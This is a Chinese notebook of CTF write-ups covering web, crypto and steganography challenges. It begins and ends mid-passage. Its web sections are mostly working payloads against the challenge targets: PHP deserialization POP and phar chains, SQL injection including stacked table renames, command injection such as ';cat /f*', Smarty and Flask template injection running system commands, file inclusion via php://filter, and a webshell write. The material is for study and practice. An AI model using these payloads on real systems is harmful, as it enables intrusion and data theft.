post:a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```
也可以使用sort
```plain
get:cmd=sort /flag
post:a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```
## [MRCTF2020]Ezpop

```plain
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```
```plain
<?php
class Modifier {
    protected  $var = "php://filter/convert.base64-encode/resource=flag.php";
}
class Show{
    public $source;
    public $str;
    public function __construct($file){
        $this->source = $file;
    }
}
class Test{
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }
}
$o = new Show('aaa');
$o->str= new Test();
$a= new Show($o);
echo urlencode(serialize($a));
```
```plain

pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22aaa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```
# 2021/4/15
## [HCTF 2018]WarmUp

考察点:1.代码审计

2.任意文件包含

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
            if (in_array($page, $whitelist)) {
                return true;
            }
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

```plain
index.php?file=hint.php?../../../../../ffffllllaaaagggg
```
## [极客大挑战 2019]EasySQL

考察点:sql注入之万能密码

![图片](https://uploader.shimo.im/f/fHYh1XRYQDRo4VmD.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

sql注入题目使用万能密码登录获得flag

```plain
check.php?username=cl4y&password=1'or'1'='1 
```
![图片](https://uploader.shimo.im/f/ptdsTKh5mcRNr4gr.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [强网杯 2019]随便注

考察点:1.堆叠注入

2.预处理语句

方法:常规:1.堆叠注入

2.预处理语句

3.handler

```plain
?inject=1%27%3B+show+columns+from+%601919810931114514%60%3B#
```
![图片](https://uploader.shimo.im/f/xGwX3AoF1sc7N7tq.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

改表名

```plain
0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#
1' or '1'='1
```
## [极客大挑战 2019]Havefun

```plain
                <!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
```
注释中的源码,让cat=dog  flag就莫名的出了。。。
```plain
?cat=dog
```
## [SUCTF 2019]EasySQL

## 
## [ACTF2020 新生赛]Include

考察点:文件包含漏洞

![图片](https://uploader.shimo.im/f/xzSvAf2PCGAwVcW3.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

直接用伪协议读取

```plain
?file=php://filter/convert.base64-encode/resource=flag.php
```
## [极客大挑战 2019]Secret File

![图片](https://uploader.shimo.im/f/SbGK46C5yBDq5KYC.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/6PLm98UksiEvVZil.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
<html>
<title>secret</title>
<meta charset="UTF-8">
<?php
highlight_file(__FILE__);
error_reporting(0);
$file=$_GET['file'];
if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
echo "Oh no!";
exit();
}
include($file);
//flag放在了flag.php里
?>
```
```plain
secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```
## [ACTF2020 新生赛]Exec

考察点:简单的命令执行

```plain
127.0.0.1;cat /f*
```
![图片](https://uploader.shimo.im/f/QFN8VHS7kcmYeQFF.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [GXYCTF2019]Ping Ping Ping

```plain
?ip=1;a=g;cat$IFS$1fla$a.php;
```
# 2021/4/16
## [CISCN2019 华东南赛区]Web11

Build With Smarty !

**Smarty**是一个[PHP](https://zh.wikipedia.org/wiki/PHP?fileGuid=H6gChgR9HdcCqkRq)下的[网页模板](https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%A0%81%E6%A8%A1%E6%9D%BF?fileGuid=H6gChgR9HdcCqkRq)系统。Smarty基本上是一种为了将不同考量的事情分离而推出的工具，这对某些应用程序是一种共通性设计策略。

根据提示在X-Forward-For处存在注入

![图片](https://uploader.shimo.im/f/PIxS8IqgeZEWTHNz.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

输入

```plain
{$smarty.version}
```
判断是否为smarty注入
![图片](https://uploader.shimo.im/f/lbuLIfHuM1x4j1fk.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
{if phpinfo()}{/if}  返回phpinfo
```
![图片](https://uploader.shimo.im/f/14HO2ynWp4PuyDqe.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
{if system('cat ../../../flag')}{/if}
```
![图片](https://uploader.shimo.im/f/0H2OrzkOTrqgELzR.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

# 2020/4/18
## [CISCN2019 华北赛区 Day1 Web1]Dropbox

考察点:任意文件下载

phar反序列化

下载得到的源码

```plain
#index.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
?>

<!DOCTYPE html>
<html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>网盘管理</title>
<head>
    <link href="static/css/bootstrap.min.css" rel="stylesheet">
    <link href="static/css/panel.css" rel="stylesheet">
    <script src="static/js/jquery.min.js"></script>
    <script src="static/js/bootstrap.bundle.min.js"></script>
    <script src="static/js/toast.js"></script>
    <script src="static/js/panel.js"></script>
</head>
<body>
    <nav aria-label="breadcrumb">
    <ol class="breadcrumb">
        <li class="breadcrumb-item active">管理面板</li>
        <li class="breadcrumb-item active"><label for="fileInput" class="fileLabel">上传文件</label></li>
        <li class="active ml-auto"><a href="#">你好 <?php echo $_SESSION['username']?></a></li>
    </ol>
</nav>
<input type="file" id="fileInput" class="hidden">
<div class="top" id="toast-container"></div>
<?php
include "class.php";
$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```
```plain

#class.php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
class User {
public $db;
public function __construct() {
global $db;
$this->db = $db;
}
public function user_exist($username) {
$stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
$stmt->bind_param("s", $username);
$stmt->execute();
$stmt->store_result();
$count = $stmt->num_rows;
if ($count === 0) {
return false;
}
return true;
}
public function add_user($username, $password) {
if ($this->user_exist($username)) {
return false;
}
$password = sha1($password . "SiAchGHmFx");
$stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
return true;
}
public function verify_user($username, $password) {
if (!$this->user_exist($username)) {
return false;
}
$password = sha1($password . "SiAchGHmFx");
$stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
$stmt->bind_param("s", $username);
$stmt->execute();
$stmt->bind_result($expect);
$stmt->fetch();
if (isset($expect) && $expect === $password) {
return true;
}
return false;
}
public function __destruct() {
$this->db->close();
}
}
class FileList {
private $files;
private $results;
private $funcs;
public function __construct($path) {
$this->files = array();
$this->results = array();
$this->funcs = array();
$filenames = scandir($path);
$key = array_search(".", $filenames);
unset($filenames[$key]);
$key = array_search("..", $filenames);
unset($filenames[$key]);
foreach ($filenames as $filename) {
$file = new File();
$file->open($path . $filename);
array_push($this->files, $file);
$this->results[$file->name()] = array();
}
}
public function __call($func, $args) {
array_push($this->funcs, $func);
foreach ($this->files as $file) {
$this->results[$file->name()][$func] = $file->$func();
}
}
public function __destruct() {
$table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
$table .= '<thead><tr>';
foreach ($this->funcs as $func) {
$table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
}
$table .= '<th scope="col" class="text-center">Opt</th>';
$table .= '</thead><tbody>';
foreach ($this->results as $filename => $result) {
$table .= '<tr>';
foreach ($result as $func => $value) {
$table .= '<td class="text-center">' . htmlentities($value) . '</td>';
}
$table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
$table .= '</tr>';
}
echo $table;
}
}
class File {
public $filename;
public function open($filename) {
$this->filename = $filename;
if (file_exists($filename) && !is_dir($filename)) {
return true;
} else {
return false;
}
}
public function name() {
return basename($this->filename);
}
public function size() {
$size = filesize($this->filename);
$units = array(' B', ' KB', ' MB', ' GB', ' TB');
for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
return round($size, 2).$units[$i];
}
public function detele() {
unlink($this->filename);
}
public function close() {
return file_get_contents($this->filename);
}
}
?>
```

```plain
#delete.php
?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
if (!isset($_POST['filename'])) {
    die();
}
include "class.php";
chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```
![图片](https://uploader.shimo.im/f/z7e1xTlx06NQ66bi.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)


![图片](https://uploader.shimo.im/f/ehtbIds6W9BhwvJG.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/dg8wEZTT3K7JLMB2.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
exp:
<?php
class User {
    public $db;
}
class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;
    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}
@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new User();
$o->db = new FileList();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?> 
```
[https://www.cnblogs.com/kevinbruce656/p/11316070.html](https://www.cnblogs.com/kevinbruce656/p/11316070.html?fileGuid=H6gChgR9HdcCqkRq)
[https://xz.aliyun.com/t/2715](https://xz.aliyun.com/t/2715?fileGuid=H6gChgR9HdcCqkRq)

```plain
File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。
User类中存在close方法，并且该方法在对象销毁时执行。
同时FileList类中存在call魔术方法，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。
根据以上三条线索，梳理一下可以得出结论:
如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。
```
## [BSidesCF 2019]Futurella

查看源代码即可得到flag

![图片](https://uploader.shimo.im/f/kO5rcpLtxFOKbBq3.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [GWCTF 2019]枯燥的抽奖

考察点:php伪随机数漏洞

前言:

```plain
PHP的mt_rand函数作为一个随机数生成工具在程序中被广泛使用，但是大家都忽略了一个事实，mt_rand生成的随机数不是一个真正的随机数，而是一个伪随机数，不能应用于生成安全令牌、核心加解密key等等，所以很多知名程序都出现过对mt_rand函数的错误使用而导致的安全问题。php_mt_seed是一个破解mt_rand函数种子的工具，对它应用场景的深刻理解和应用能极大的提升漏洞发现的可能和利用的成功率。本文将详细介绍PHP mt_rand函数的安全问题及php_mt_seed应用场景。
mt_rand就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。
```
查看源代码看到check.php
```plain
vrhzBygDyx
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}
mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";
if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php"); 
```
将字母换原为生成的伪随机数。
```plain
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='vrhzBygDyx'
      
str3 = str1[::-1]
length = len(str2)
res=''
for i in range(len(str2)):  
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print(res)
```
利用php_mt_seed生成种子

![图片](https://uploader.shimo.im/f/TeKuIWIkXNr2BRr3.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

利用生成的种子生成序列提交即可获得flag

```plain
<?php
mt_srand(797432830);

$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);
}
echo $str;

?>
```


## [MRCTF2020]套娃

考点:1.代码审计

2.伪协议

3.绕过技巧

4.client-ip

```plain
$query = $_SERVER['QUERY_STRING'];

if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
die('Y0u are So cutE!');
}
if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
echo "you are going to the next ~";
}
```
使用.可绕过_,preg_match没有/m，因此用%0a就可以了
```plain
?b.u.p.t=23333%0a
```
进入了下一关
![图片](https://uploader.shimo.im/f/Q16pix1M9BlgOb5q.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

查看网页源代码有一段Jsfuck，Merak post提交获得源码

```plain
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';
if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```
绕过三个地方就可以得到flag

第一:ip=127.0.0.1,这个用client-ip就可以绕过

第二:file_get_contents($_GET['2333']) === 'todat is a happy day' ),使用data伪协议绕过，

```plain
?2333=data://text/plain,todat%20is%20a%20happy%20day
```
change函数这里使用了一个简单的算法
```plain
function change($v){
$v = base64_decode($v);
$re = '';
for($i=0;$i<strlen($v);$i++){
$re .= chr ( ord ($v[$i]) + $i*2 );
}
return $re;
```
那我们就逆一下这个
```plain
<?php
$re = '';
function change($v)
{
    for ($i = 0; $i < strlen($v); $i++) {
        $re .= chr(ord($v[$i]) - $i * 2);
    }
    $re=base64_encode($re);
    return $re;
}
$a='flag.php';
echo change($a);
```
![图片](https://uploader.shimo.im/f/dhl138dUqL2lCVwc.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

# 2020/4/20
根据提示,修改cookie

```plain
monster:admin
```
![图片](https://uploader.shimo.im/f/Yohw38R50yLfVpiK.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

得到回显 set-cookie:设置username

```plain
monster:admin;username:admin
```
![图片](https://uploader.shimo.im/f/TzC4LHGYFi4N7lzZ.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)





题目源码

```plain
<?php
putenv('PATH=/home/rceservice/jail');
if (isset($_REQUEST['cmd'])) {
    $json = $_REQUEST['cmd'];
    if (!is_string($json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } else {
        echo 'Attempting to run command:<br/>';
        $cmd = json_decode($json, true)['cmd'];
        if ($cmd !== NULL) {
            system($cmd);
        } else {
            echo 'Invalid input';
        }
        echo '<br/><br/>';
    }
}
?>
```
```plain
?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"%0a}
```
[https://blog.csdn.net/rfrder/article/details/110573955](https://blog.csdn.net/rfrder/article/details/110573955?fileGuid=H6gChgR9HdcCqkRq)

# 2021/4/21
## [WUSTCTF2020]颜值成绩查询

```plain
import requests
url = 'http://f4efb6bb-bd98-43f6-b5f0-33f3dac0e142.node3.buuoj.cn/?stunum='
flag=''
for i in range(1,50):
min=32
max=125
while 1:
j=min+(max-min)//2
if min==j:
flag+=chr(j)
print(flag)
break
payload="if(ascii(substr((select/**/value/**/from/**/flag),%d,1))<%d,1,2)"%(i,j)
r=requests.get(url=url+payload).text
#print(r)
if 'your score is: 100' in r:
max=j
else :
min=j

```


## [CSCCTF 2019 Qual]FlaskLight

查看源代码提示 search get传参

![图片](https://uploader.shimo.im/f/SJCqWgXWhSlturN0.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

然后我们准备寻找os类

```plain
{{[].__class__.__base__.__subclasses__()}}
```
无奈找不到
然后看一眼wp，需要找存在Popen的类来执行命令

```plain
#查找可以利用的类 利用subprocess.Popen执行命令
import requests
import re
import html
import time
index = 0
for i in range(170, 1000):
    try:
        url = "http://878e7c4d-d15f-432c-bcb4-d327685a1f55.node3.buuoj.cn/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
        r = requests.get(url)
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text)
        time.sleep(0.1)
        # print(res)
        # print(r.text)
        res = html.unescape(res[0])
        print(str(i) + " | " + res)
        if "subprocess.Popen" in res:
            index = i
            break
    except:
        continue
print("indexo of subprocess.Popen:" + str(index))
```
贴一个查找类的通用脚本
```plain
import requests
import html
import time
for i in range(0,300):
    time.sleep(0.06)
    url='http://878e7c4d-d15f-432c-bcb4-d327685a1f55.node3.buuoj.cn/?search={{\'\'.__class__.__mro__[2].__subclasses__()[%d]}}' %(i)
    r = requests.get(url)
    print(url)
    if "subprocess.Popen" in html.unescape(r.text):
        print(i)
        break
```

```plain
?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```
## [极客大挑战 2019]RCE ME

一开始给了源码

```plain
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}
// ?>
```
明显的无数字字母rce，但是长度要在40以内
所以只能使用取反

先尝试执行phpinfo()

```plain
(~%8F%97%8F%96%91%99%90)();
```
![图片](https://uploader.shimo.im/f/CBJH5xmzuEPX70Do.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

禁用了一堆命令执行的函数,但是可以写木马

```plain
 (~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6);
```
能连shell但是执行不了命令
使用插件bypass(心酸)

![图片](https://uploader.shimo.im/f/XOi8lg1X7Ffi39GJ.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

![图片](https://uploader.shimo.im/f/ge4Jqwdk3MA3LHva.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [Zer0pts2020]Can you guess it?

```plain
<?php
include 'config.php'; // FLAG is defined in config.php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}
if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
```
```plain
/index.php/config.php/%80?source
```

# 2020/4/22
## [WUSTCTF2020]spaceclub

考察点:二进制转字符串

## [XMAN2018排位赛]通行证

考察点:base64-》凯撒->栅栏

## [WUSTCTF2020]爬

考察点:PDF隐写,hextostring

## [WUSTCTF2020]girlfriend

![图片](https://uploader.shimo.im/f/QB7r9v48T66ZRaGW.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
999     --->   y
666     --->   o
88      --->   u
2       --->   a
777     --->   r
33      --->   e
6       --->   m
999     --->   y
4       --->   g
4444    --->   i
777     --->   r
555     --->   l
333     --->   f
777     --->   r
444     --->   i
33      --->   e
66      --->   n
3       --->   d
7777    --->   s
```
## 二维码

考察点:ps

![图片](https://uploader.shimo.im/f/zWhTsvwlkCm701vH.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [GUET-CTF2019]虚假的压缩包

考察点:伪加密,rsa,脑洞,docx隐写

解伪加密之后给了n 和 e

```plain
import gmpy2
p = 3
q = 11
e = 0x3
c = 26
n = 33
s = (p- 1) * (q - 1)
d = gmpy2.invert(e,s)
m = pow(c,d,n)
print pow(c, d, n)
```
得到密码是5(rsa得到5,脑洞中文密码，密码是5)
得到

![图片](https://uploader.shimo.im/f/cLaeaHr4OJLsIQAH.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
original = open("亦真亦假",'r').read()
flag = open("flag",'w')
for i in original:
tmp = int(i,16)^5
flag.write(hex(tmp)[2:])
```
zip转docx，改变字体颜色
![图片](https://uploader.shimo.im/f/OwPiLIl4y1sDvaoR.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [SWPU2019]Network

```plain
import binascii
with open('attachment.txt','r') as fp:
    a=fp.readlines()
    p=[]
    for x in range(len(a)):
       p.append(int(a[x])) 
    s=''
    for i in p:
        if(i==63):
            b='00'
        elif(i==127):
            b='01'
        elif(i==191):
            b='10'
        else:
            b='11'
        s +=b
# print(s)
flag = ''
for i in range(0,len(s),8):
    flag += chr(int(s[i:i+8],2))
flag = binascii.unhexlify(flag)
wp = open('ans.zip','wb')
wp.write(flag)
wp.close()
```

```plain
# -*- encoding: utf-8 -*-
import base64
f = open('flag.txt','rb').read()
while True:
    f = base64.b64decode(f)
    if b'{' in f:
        print(f)
        break
    else:
        continue
```
2021/4/23
## [UTCTF2020]docx

考察点:docx->zip

在media里有flag的图片

## [UTCTF2020]file header

修改png文件头

# 2021/4/24
## [*CTF2019]otaku

![图片](https://uploader.shimo.im/f/3ziuH6Sx6REyX8Tg.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

docx里隐藏下图文字，flag.zip为伪加密，看到flag.zip里的内容，想到用隐藏的文字进行明文攻击。

![图片](https://uploader.shimo.im/f/VqsWwrscYw3VtEae.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

但是无奈，压缩后CRC的值不同，哭哭。

明文攻击得到密钥，得到一张png图片 zsteg分析拿到flag

![图片](https://uploader.shimo.im/f/42a6H23PetE1iXFD.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## 真的很杂

binwalk-e分离得到一堆不知道啥玩意

![图片](https://uploader.shimo.im/f/zIDkHWLX0WAxwCYk.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [ACTF新生赛2020]剑龙

考察点:颜文字，steghide，pyc隐写

```plain
python3 stegosaurus.py -x O_O.pyc
```
![图片](https://uploader.shimo.im/f/TK8P2YRy0kYyueVG.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [QCTF2018]X-man-A face

考察点:ps补全，base32

## [MRCTF2020]pyFlag

每张图片的末尾有，部分zip的内容，合并之后得到一个完整的zip

![图片](https://uploader.shimo.im/f/HD0dFNpNAj3iNzie.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

爆破一下得到密码

利用hint破解flag.txt里的内容

```plain
#!/usr/bin/env python
import base64
import re
def baseDec(text,type):
    if type == 1:
        return base64.b16decode(text)
    elif type == 2:
        return base64.b32decode(text)
    elif type == 3:
        return base64.b64decode(text)
    elif type == 4:
        return base64.b85decode(text)
    else:
        pass
def detect(text):
    try:
        if re.match("^[0-9A-F=]+$",text.decode()) is not None:
            return 1
    except:
        pass
    
    try:
        if re.match("^[A-Z2-7=]+$",text.decode()) is not None:
            return 2
    except:
        pass
    try:
        if re.match("^[A-Za-z0-9+/=]+$",text.decode()) is not None:
            return 3
    except:
        pass
    
    return 4
def autoDec(text):
    while True:
        if b"MRCTF{" in text:
            print("\n"+text.decode())
            break
        code = detect(text)
        text = baseDec(text,code)
with open("flag.txt",'rb') as f:
    flag = f.read()
autoDec(flag)
```
## Business Planning Group

png藏了一张bpg图片，查看bpg得到base64

![图片](https://uploader.shimo.im/f/UNUNxLlmoaUxdDTJ.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

解码拿到flag

## [GWCTF2019]huyao

考察点:频域盲水印

两张相同的png图片，考虑为盲水印或者是频域盲水印,尝试后是频域盲水印

```plain
import cv2
import numpy as np
import random
import os
